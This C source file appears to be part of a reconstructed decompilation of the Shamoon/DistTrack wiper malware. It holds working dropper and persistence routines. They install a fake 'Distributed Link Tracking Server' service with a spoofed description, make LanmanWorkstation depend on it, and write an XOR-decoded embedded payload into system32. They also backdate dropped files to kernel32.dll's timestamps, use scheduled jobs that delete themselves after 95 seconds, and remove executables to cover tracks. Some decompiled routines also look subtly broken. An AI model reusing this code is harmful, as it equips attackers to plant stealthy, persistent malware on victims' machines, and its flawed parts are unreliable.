/******************************************************************************************
  Copyright 2013 Christian Roggia

   Licensed under the Apache License, Version 2.0 (the "License");
   you may not use this file except in compliance with the License.
   You may obtain a copy of the License at

       http://www.apache.org/licenses/LICENSE-2.0

   Unless required by applicable law or agreed to in writing, software
   distributed under the License is distributed on an "AS IS" BASIS,
   WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
   See the License for the specific language governing permissions and
   limitations under the License.
******************************************************************************************/

// MODIFIED BY mic.ric.tor
#include "0.h"
#include <LMat.h>

DWORD GetRandom()
{
	DWORD dwTickCount = GetTickCount();

	// Return absolute value of difference between TickCount and the last random number
	return g_last_random_number = (dwTickCount < g_last_random_number) ? (g_last_random_number - dwTickCount) : (dwTickCount - g_last_random_number);
}

WCHAR *strcpyW(WCHAR *a1, const WCHAR *a2, ...)
{
	va_list va;

	va_start(va, a2);
	if(!a1 || !a2) return 0;
	
	for(char * i = (char *)a1; *(int *)va; --*(int *)va)
	{
		*i = i[(char *)a2 - (char *)a1];
		++i;
	}
	
	return a1;
}

// fill dst with specified number of chrs
char *strset(char *dst, char chr, int size)
{
	for( int i=1; i < size; i++ )
	{
		*(dst + i) = chr;
	}
	return dst;
}

UINT32 strlenW(const WCHAR *string)
{
	UINT32 i = 0; // eax@1

	if(string)
	{
		while((LOBYTE(string[i]) || HIBYTE(string[i])) && i < 2000000000)
			++i;
	}
	
	return i;
}

bool strcmpW(WCHAR *a1, WCHAR *a2)
{
	WCHAR *v2; // eax@1
	bool v3; // zf@2
	WCHAR *v5; // ecx@5
	WCHAR v6; // dx@8
	WCHAR v7; // di@9

	v2 = a1;
	if(a1)
	{
		v5 = a2;
		if(!a2)
			return 0;
		while(*v2)
		{
			v6 = *v5;
			if(!*v5)
				break;
			v7 = *v2;
			++v5;
			++v2;
			if(v7 != v6)
				return 0;
		}
		if(*v2)
			return 0;
		v3 = *v5 == 0;
	}
	else
	{
		v3 = a2 == 0;
	}
	if(v3)
		return 1;
	return 0;
}

char *btowc(char *a1, WCHAR *a2, int a3)
{
	char *v3; // ebx@1
	char *v4; // esi@2
	int v5; // edi@3
	char *result; // eax@6

	v3 = a1;
	if(a1 && (v4 = (char *)a2) != 0)
	{
		v5 = a3;
		memset(a2, 0, 2 * a3);
		if(a3)
		{
			do
			{
				if(!*v3)
					break;
				*v4 = *v3;
				v4 += 2;
				++v3;
				--v5;
			}
			while(v5);
		}
		*(WCHAR *)v4 = 0;
		result = v4;
	}
	else
	{
		result = 0;
	}
	return result;
}

DWORD GetProcessID(WCHAR *process_name)
{
	HANDLE hSnapshot; // esi@1
	PROCESSENTRY32W pe; // [sp+8h] [bp-230h]@1

	pe.dwSize = 556;
	hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if(hSnapshot == INVALID_HANDLE_VALUE) return 0;
	
	Process32FirstW(hSnapshot, &pe);
	while(!strcmpW(process_name, pe.szExeFile))
	{
		if(!Process32NextW(hSnapshot, &pe))
		{
			CloseHandle(hSnapshot);
			return 0;
		}
	}
	CloseHandle(hSnapshot);
	
	return pe.th32ProcessID;
}

DWORD SearchProcessByIdOrName(DWORD dwPID, WCHAR *szProcessName)
{
	HANDLE hProcess; // eax@4

	if(!dwPID && !szProcessName)					return 0;
	if((dwPID = GetProcessID(szProcessName)) == 0)	return 0;
	
	if((hProcess = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, dwPID)) == 0) return 0;

	CloseHandle(hProcess);
	return dwPID;
}

void ResetArgs()
{
	if(g_argv)
		LocalFree(g_argv);
	
	g_argc = 0;
}

int DeleteJobAfter95Seconds(JOB_PROPERTIES *lpAddress)
{
	if(lpAddress)
	{
		Sleep(95000);
		NetScheduleJobDel(lpAddress->IsServerNameSet ? (const WCHAR *)lpAddress : 0, lpAddress->JobId, lpAddress->JobId);
		VirtualFree(lpAddress, 0, MEM_RELEASE);
	}
	
	return 0;
}

bool ConfigureTrkSvr(LPCWSTR lpMachineName, const WCHAR *path)
{	
	SC_HANDLE hSCManager; // [sp+Ch] [bp-400h]@1
	LPCWSTR svc_path;
	DWORD pcbBytesNeeded; // [sp+18h] [bp-3F4h]@4
	SC_HANDLE svc_trksrv; // [sp+1Ch] [bp-3F0h]@3
	LPQUERY_SERVICE_CONFIGW lpServiceConfig;

	WCHAR *service_info = "Enables the Distributed Link Tracking Client service within the same domain to provide more reliable and efficient maintenance of links within the domain. If this service is disabled, any services that explicitly depend on it will fail to start.";
	svc_path = path;

	hSCManager = OpenSCManagerW(lpMachineName, NULL, SC_MANAGER_ALL_ACCESS);
	if(!hSCManager) return 0;
	
	svc_trksrv = OpenServiceW(hSCManager, L"TrkSvr", SC_MANAGER_ALL_ACCESS);
	/** ----->> If the service does not exists create it. <<----- **/
	if(!svc_trksrv)
	{
		if(GetLastError() == ERROR_SERVICE_DOES_NOT_EXIST)
		{
			svc_trksrv = CreateServiceW(hSCManager, L"TrkSvr", L"Distributed Link Tracking Server", 0xF01FF, 0x10, 2, 0, svc_path, 0, 0, L"RpcSs", 0, 0);
			if(svc_trksrv)
			{
				goto changeDescription;
			}
		}
		
		CloseServiceHandle(hSCManager);
		return 0;
	}

	pcbBytesNeeded = 0;
	if(!QueryServiceConfigW(svc_trksrv, NULL, NULL, &pcbBytesNeeded) && GetLastError() == ERROR_INSUFFICIENT_BUFFER)
		lpServiceConfig = (LPQUERY_SERVICE_CONFIGW)LocalAlloc(0, pcbBytesNeeded);
	
	if(!QueryServiceConfigW(svc_trksrv, lpServiceConfig, pcbBytesNeeded, &pcbBytesNeeded))
		goto noConfig;
	
	/** ----->> Compare the last 3 characters of the dependencies with "vcs" (???) <<----- **/
	//v5 = (WCHAR *)&byte_416552[strlenW(L"C:\\Windows\\system32\\svchost.exe -k netsvcs")]; // Strange
	if(!strcmpW(&lpServiceConfig->lpBinaryPathName[strlenW(lpServiceConfig->lpBinaryPathName) - 3], L"vcs")) // L"vcs" = v5
	{
		CloseServiceHandle(svc_trksrv);
		CloseServiceHandle(hSCManager);
		return 0;
	}
	
	/** ----->> Change service config, register it as startup service <<----- **/
	ChangeServiceConfigW(svc_trksrv, SERVICE_WIN32_OWN_PROCESS, SERVICE_AUTO_START, SERVICE_ERROR_IGNORE, svc_path, NULL, 0, L"RpcSs", NULL, NULL, NULL);
	
changeDescription:
	/** ----->> Change the service description <<----- **/
	ChangeServiceConfig2W(svc_trksrv, SERVICE_CONFIG_DESCRIPTION, &service_info);
	
noConfig:
	HKEY reg_key;
	if(!lpMachineName && !RegOpenKeyExW(HKEY_LOCAL_MACHINE, L"SYSTEM\\CurrentControlSet\\Services\\TrkSvr", 0, KEY_ALL_ACCESS, &reg_key))
	{
		RegDeleteValueW(reg_key, L"WOW64");
		RegCloseKey(reg_key);
	}
	
	/** ----->> Finally start the service <<----- **/
	StartServiceW(svc_trksrv, 0, NULL);
	CloseServiceHandle(svc_trksrv);
	
	
	SC_HANDLE svc_lanman = OpenServiceW(hSCManager, L"LanmanWorkstation", SC_MANAGER_ALL_ACCESS);
	if(svc_lanman)
	{
		LPQUERY_SERVICE_CONFIGW svc_config;

		pcbBytesNeeded = 0;
		if(QueryServiceConfigW(svc_lanman, 0, 0, &pcbBytesNeeded) || GetLastError() != 122)
			svc_config = (LPQUERY_SERVICE_CONFIGW)lpMachineName;
		else
			svc_config = (LPQUERY_SERVICE_CONFIGW)LocalAlloc(0, pcbBytesNeeded);
		
		if(QueryServiceConfigW(svc_lanman, svc_config, pcbBytesNeeded, &pcbBytesNeeded))
		{
			WCHAR Dependencies[500];

			WCHAR *dep = svc_config->lpDependencies;
			INT32 dep_len = 0;
			INT32 dep_size = 0;

			// copy dependencies into array
			if(dep && *dep)
			{
				while(dep[dep_len] || dep[dep_len + 1])// Account for null bytes
					++dep_len;
				
				dep_size = dep_len + 1;
				strcpyW(Dependencies, dep, 2 * dep_size);
			}
			
			// Add TrkSvr to the dependencies if we haven't already
			if(!strcmpW(L"TrkSvr", &Dependencies[dep_size - strlenW(L"TrkSvr") + 1]))
			{
				strcpyW(&Dependencies[dep_size], L"TrkSvr", 2 * strlenW(L"TrkSvr"));
				Dependencies[dep_size + strlenW(L"TrkSvr")] = 0;
				Dependencies[dep_size + strlenW(L"TrkSvr") + 1] = 0;
				ChangeServiceConfigW(svc_lanman, svc_config->dwServiceType, svc_config->dwStartType, svc_config->dwErrorControl, 0, 0, 0, Dependencies, 0, 0, 0);
			}
		}
		
		CloseServiceHandle(svc_lanman);
	}
	
	CloseServiceHandle(hSCManager);
	return 1;
}

bool ForceFileDeletion(LPCWSTR file_to_delete)
{
	if(!DeleteFileW(file_to_delete))
		MoveFileExW(file_to_delete, NULL, MOVEFILE_DELAY_UNTIL_REBOOT);
	
	return 1;
}

void DeleteServiceExecutables()
{
	const WCHAR *exec_name; // [sp+20h] [bp-808h]@1
	WCHAR exec_path[1024]; // [sp+24h] [bp-804h]@2


	exec_name = g_random_exec_name[0];
	do
	{
		strcpyW(exec_path, g_windows_directory, strlenW(g_windows_directory) * sizeof(WCHAR));
		strcpyW(&exec_path[strlenW(g_windows_directory)], L"\\system32\\", sizeof(WCHAR) * strlenW(L"\\system32\\"));
		strcpyW(&exec_path[strlenW(g_windows_directory) + strlenW(L"\\system32\\")], exec_name, sizeof(WCHAR) * strlenW(exec_name));
		strcpyW(&exec_path[strlenW(g_windows_directory) + strlenW(L"\\system32\\") + strlenW(exec_name)], L".exe", sizeof(WCHAR) * strlenW(L".exe"));
		
		exec_path[strlenW(exec_name) + strlenW(g_windows_directory) + strlenW(L"\\system32\\") + strlenW(L".exe")] = 0;
		DeleteFileW(exec_path);

		// Because of how g_random_exec_name is declared, this advances to next exec
		exec_name += 15;
	}
	while(exec_name < &exec_name[29]); // If we've reached the last pointer, end
}

typedef int (__stdcall *disableFSRedirection_t)(PVOID *);
int _Wow64DisableWow64FsRedirection(PVOID *OldValue)
{
	disableFSRedirection_t func = GetProcAddress(GetModuleHandleW(L"kernel32.dll"), "_Wow64DisableWow64FsRedirection");
	
	if( func )
	{
		return func( OldValue );
	}

	return 0;
}

typedef int (__stdcall *revertFSRedirection_t)(PVOID);
int _Wow64RevertWow64FsRedirection(PVOID OldValue)
{
	revertFSRedirection_t func = GetProcAddress(GetModuleHandleW(L"kernel32.dll"), "_Wow64RevertWow64FsRedirection");

	if( func )
	{
		return func( OldValue );
	}

	return 0;
}

bool Is32Bit()
{
	HKEY hKey;
	DWORD size = 100;
	BYTE Data[100];
	WCHAR processor_architecture[52]; // [sp+74h] [bp-6Ch]@4

	if(RegOpenKeyExW(HKEY_LOCAL_MACHINE, L"SYSTEM\\CurrentControlSet\\Control\\Session Manager\\Environment", 0, KEY_EXECUTE, &hKey))
		return false;
	
	if( RegQueryValueExW(hKey, L"PROCESSOR_ARCHITECTURE", 0, Data, &size) != ERROR_SUCCESS ) 
	{
		RegCloseKey(hKey);
		return false;
	}
	
	memmove(processor_architecture, Data, size);
	processor_architecture[size / 2] = 0;
	
	if(wcscmp(L"AMD64", processor_architecture) && wcscmp(L"amd64", processor_architecture))
		return false;
	
	return true;
}

BOOL IsLeapYear(signed int year)
{
	bool v1; // zf@2

	if(year <= 0) // The fuck?
		return FALSE;
	
	v1 = (year & 0x80000003) == 0;
	
	if((year & 0x80000003) < 0)
		v1 = (((year & 0x80000003) - 1) | 0xFFFFFFFC) == -1;
	
	return (v1 && (year % 100 || !(year % 400))) ? TRUE : FALSE;
}

DWORD g_days_in_month[] =
{
	31, 28, 31, 30,
	31, 30, 31, 31,
	30, 31, 30, 31
};

int GetDaysInMonth(signed int year, unsigned int month)
{
	if((month - 1) > 11) 
		return 0;
	
	int days = g_days_in_month[month];

	// February leap-year shit
	if(month == 2)
	{
		if(IsLeapYear(year))
			++days;
	}

	return days;
}

bool WriteEncodedResource(LPCWSTR lpFileName, HMODULE hModule, LPCWSTR lpName, LPCWSTR lpType, char *key, unsigned int key_len)
{
	char *v10; // eax@9
	void *lpAddress; // [sp+8h] [bp-20h]@9
	char *v16; // [sp+18h] [bp-10h]@10

	HRSRC res = FindResourceW(hModule, lpName, lpType);
	if(!res) 
		return false;

	HGLOBAL res_handle = LoadResource(hModule, res);
	if(!res_handle)
		return false;

	char *res_content = (char *)LockResource(res_handle);
	if(!res_content)
		return false;

	DWORD res_size = SizeofResource( hModule, res );
	if(!res_size)
		return false;
	
	PVOID oldValue = NULL;
	
	if((_Wow64DisableWow64FsRedirection(&oldValue)) == 0) 
		return false;

	HANDLE hObject = CreateFileW(lpFileName, GENERIC_WRITE, FILE_SHARE_READ, NULL, CREATE_ALWAYS, 0, NULL); 

	if((_Wow64RevertWow64FsRedirection(oldValue)) == 0)   
		return false;
	
	if(!hObject || hObject == INVALID_HANDLE_VALUE) 
		return false;
	
	unsigned int i = 0;
	unsigned int NumberOfBytesWritten = 0;
	
	char decoded_byte;

	while(i < res_size)
	{
		decoded_byte = res_content[i] ^ key[i % key_len];
		WriteFile(hObject, &decoded_byte, 1, &NumberOfBytesWritten, 0);
		++i;
		
		if(i >= 1024)
		{
			if(i < res_size)
			{
				v10 = (char *)VirtualAlloc(NULL, res_size - i, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
				lpAddress = v10;
				if(v10)
				{
					v16 = &v10[-i];
					
					do
					{
						v16[i] = res_content[i] ^ key[i % key_len];
						++i;
					}
					while(i < res_size);
					
					WriteFile(hObject, v10, res_size - 1024, &NumberOfBytesWritten, 0);
					VirtualFree(lpAddress, 0, MEM_RELEASE);
				}
			}
			break;
		}
	}
		
	CloseHandle(hObject);

	return true;
}

bool GetRandomServiceInfo(WCHAR *svc_name, WCHAR *svc_path)
{
	// Only try 29 times
	// 	Because this is random this is odd	
	for( int i = 0; i < 29; i++ ) 
	{
		WCHAR *rnd_svc_name = g_random_exec_name[GetRandom() % 29];
		
		strcpyW(svc_name, rnd_svc_name, 2 * strlenW(rnd_svc_name));
		strcpyW(&svc_name[strlenW(rnd_svc_name)], L".exe", 2 * strlenW(L".exe"));
		svc_name[strlenW(rnd_svc_name) + strlenW(L".exe")] = 0;
		
		strcpyW(svc_path, g_windows_directory, 2 * strlenW(g_windows_directory));
		strcpyW(&svc_path[strlenW(g_windows_directory)], L"\\system32\\", 2 * strlenW(L"\\system32\\"));
		strcpyW(&svc_path[strlenW(g_windows_directory) + strlenW(L"\\system32\\")], svc_name, 2 * strlenW(svc_name));
		svc_path[strlenW(g_windows_directory) + strlenW(L"\\system32\\") + strlenW(svc_name)] = 0;
		
		PVOID oldValue = NULL;
		_Wow64DisableWow64FsRedirection(oldValue);
		HANDLE file_handle = CreateFileW(svc_path, GENERIC_READ, 7, 0, 3, FILE_FLAG_OPEN_NO_RECALL, 0);
		DWORD last_err = GetLastError();
		_Wow64RevertWow64FsRedirection(oldValue);
		
		// If we can write to the file, we've succeeded
		if( file_handle == INVALID_HANDLE_VALUE && last_err == ERROR_FILE_NOT_FOUND )
			return true;
		
		CloseHandle(file_handle);
	}
	
	return false;
}

bool GetTrksrvServiceInfo(WCHAR *svc_filename, WCHAR *svc_path)
{	
	strcpyW(svc_filename, L"trksvr.exe", 2 * strlenW(L"trksvr.exe"));
	svc_filename[strlenW(L"trksvr.exe")] = 0;
	
	strcpyW(svc_path, g_windows_directory, 2 * strlenW(g_windows_directory));
	strcpyW(&svc_path[strlenW(g_windows_directory)], L"\\system32\\", 2 * strlenW(L"\\system32\\"));
	strcpyW(&svc_path[strlenW(g_windows_directory) + strlenW(L"\\system32\\")], svc_filename, 2 * strlenW(svc_filename));
	svc_path[strlenW(g_windows_directory) + strlenW(L"\\system32\\") + strlenW(svc_filename)] = 0;
	
	PVOID oldValue = NULL;
	_Wow64DisableWow64FsRedirection(&oldValue);

	HANDLE svc = CreateFileW(svc_path, GENERIC_READ, 7, 0, 3, FILE_FLAG_OPEN_NO_RECALL, 0);

	if(svc != INVALID_HANDLE_VALUE || GetLastError() != ERROR_FILE_NOT_FOUND)
	{
		CloseHandle(svc);
		if(!DeleteFileW(svc_path))
		{
			_Wow64RevertWow64FsRedirection(oldValue);
			return false;
		}
	}
	_Wow64RevertWow64FsRedirection(oldValue);
	
	return true;
}

bool GetNetinitServiceInfo(WCHAR *svc_name, WCHAR *svc_path)
{
	strcpyW(svc_name, L"netinit", 2 * strlenW(L"netinit"));
	strcpyW(&svc_name[strlenW(L"netinit")], L".exe", 2 * strlenW(L".exe"));
	svc_name[strlenW(L"netinit") + strlenW(L".exe")] = 0;
	
	strcpyW(svc_path, g_windows_directory, 2 * strlenW(g_windows_directory));
	strcpyW(&svc_path[strlenW(g_windows_directory)], L"\\system32\\", 2 * strlenW(L"\\system32\\"));
	strcpyW(&svc_path[strlenW(g_windows_directory) + strlenW(L"\\system32\\")], svc_name, 2 * strlenW(svc_name));
	svc_path[strlenW(g_windows_directory) + strlenW(L"\\system32\\") + strlenW(svc_name)] = 0;
	
	PVOID oldValue = NULL;
	_Wow64DisableWow64FsRedirection(&oldValue);
	DeleteFileW(svc_path);
	_Wow64RevertWow64FsRedirection(oldValue);
	
	return true;
}

bool GeneralSetup()
{

	GetWindowsDirectoryW(g_windows_directory, 100);
	
	// kernel_path = %SYSTEM%\\system32\\kernel32.dll
	WCHAR kernel_path[256];

	memmove(kernel_path, g_windows_directory, 2 * strlenW(g_windows_directory));
	memmove(&kernel_path[strlenW(g_windows_directory)], L"\\system32\\kernel32.dll", 2 * strlenW(L"\\system32\\kernel32.dll"));
	kernel_path[strlenW(g_windows_directory) + strlenW(L"\\system32\\kernel32.dll")] = 0;
	
	PVOID oldValue = 0;
	_Wow64DisableWow64FsRedirection(&oldValue);
	HANDLE kernel_handle = CreateFileW(kernel_path, GENERIC_READ, FILE_SHARE_DELETE | FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_FLAG_OPEN_NO_RECALL, NULL);
	_Wow64RevertWow64FsRedirection(oldValue);
	
	if(kernel_handle != INVALID_HANDLE_VALUE)
	{
		if(!GetFileTime(kernel_handle, &g_kernel_creation_time, &g_kernel_last_access_time, &g_kernel_last_write_time))
		{
			g_kernel_creation_time.dwHighDateTime = 0;
			g_kernel_creation_time.dwLowDateTime = 0;
		}
		
		CloseHandle(kernel_handle);
	}
	
	g_argv = CommandLineToArgvW(GetCommandLineW(), &g_argc);
	if(g_argv)
	{
		strcpyW(g_module_path, g_argv[0], 2 * strlenW(g_argv[0]) + 2);
		return true;
	}
	
	return false;
}

bool IsFileAccessible(LPCWSTR lpFileName)
{
	PVOID oldValue = NULL;
	_Wow64DisableWow64FsRedirection(&oldValue);
	HANDLE file_handle = CreateFileW(lpFileName, GENERIC_READ, 1, 0, 3, FILE_FLAG_OPEN_NO_RECALL, 0);
	_Wow64RevertWow64FsRedirection(oldValue);
	
	if(file_handle == INVALID_HANDLE_VALUE) return false;
	
	CloseHandle(file_handle);
	return true;
}

bool SetReliableFileTime(LPCWSTR lpFileName)
{
	bool v1; // bl@1

	v1 = 0;
	
	if(!g_kernel_creation_time.dwLowDateTime) return false;
	if(!lpFileName) return false;
	
	PVOID oldValue = NULL;
	_Wow64DisableWow64FsRedirection(&oldValue);
	HANDLE file_handle = CreateFileW(lpFileName, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_DELETE | FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_FLAG_OPEN_NO_RECALL, NULL);
	_Wow64RevertWow64FsRedirection(oldValue);
	
	if(file_handle == INVALID_HANDLE_VALUE) return false;
	
	if(SetFileTime(file_handle, &g_kernel_creation_time, &g_kernel_last_access_time, &g_kernel_last_write_time))
		v1 = 1;
	
	CloseHandle(file_handle);
	return v1;
}